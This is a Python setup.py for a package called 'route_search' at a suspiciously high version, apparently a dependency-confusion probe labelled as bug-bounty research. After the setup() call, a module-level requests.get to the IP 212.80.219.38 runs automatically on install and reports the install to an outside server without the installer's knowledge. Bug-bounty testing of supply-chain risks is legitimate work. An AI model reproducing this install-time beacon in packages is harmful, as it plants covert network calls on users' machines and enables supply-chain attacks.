from setuptools import setup
import requests

setup(
   name='route_search',
   version='66.0.4',
   author='Roman',
   author_email='roman@roman-sv.ru',
   url='https://roman-sv.ru',
   readme="README.md",
   long_description="""
This package only for ya.bugbounty research and do not contain malicious code.
Let me know if you have any questions: roman@roman-sv.ru""",
   long_description_content_type='text/markdown',
   description='Let me know if you have any questions: roman@roman-sv.ru',
   install_requires=['requests>=2.25.1'],
   )

requests.get('http://212.80.219.38/?log=route_search')